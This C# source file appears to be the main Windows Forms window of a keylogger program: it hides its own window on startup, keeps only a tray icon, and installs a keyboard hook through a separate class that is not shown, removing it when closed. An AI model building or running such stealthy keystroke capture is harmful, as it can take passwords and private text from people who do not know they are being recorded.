using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace KeyLoger
{
	public partial class KeyLogerApp : Form
	{
		KeyLoger keyLoger = new KeyLoger();
		public KeyLogerApp()
		{
			InitializeComponent();
			
			
			Load += KeyLogerApp_Load;
			Shown += KeyLogerApp_Shown;
			FormClosed += KeyLogerApp_FormClosed;
			notifyIcon1.DoubleClick += NotifyIcon1_DoubleClick;


			//using (StreamWriter sw = new StreamWriter(@"D:\desktop\result.txt"))
			//using (StreamReader sr = new StreamReader(@"D:\desktop\source.txt"))
			//{
			//	while (!sr.EndOfStream)
			//	{
			//		string c = sr.ReadLine();
			//		string v = sr.ReadLine();
			//		v = v.Trim(' ');
			//		c = c.Trim(' ');
			//		v = v.Replace(' ', '_');
			//		c = c.Replace(' ', '_');

			//		sw.WriteLine($"case \"{v}\":");
			//		sw.WriteLine($"keyStr = \"{c} \";");
			//		sw.WriteLine($"break;");
			//	}
			//}
		}

		private void KeyLogerApp_Shown(object sender, EventArgs e)
		{
			Visible = false;
			WindowState = FormWindowState.Minimized;
		}

		private void NotifyIcon1_DoubleClick(object sender, EventArgs e)
		{
			Close();
		}

		private void KeyLogerApp_Load(object sender, EventArgs e)
		{
			WindowState = FormWindowState.Minimized;
			notifyIcon1.Icon = Icon;
			keyLoger.SetHook();
		}

		private void KeyLogerApp_FormClosed(object sender, FormClosedEventArgs e)
		{
			keyLoger.UnHook();
		}
	}
}
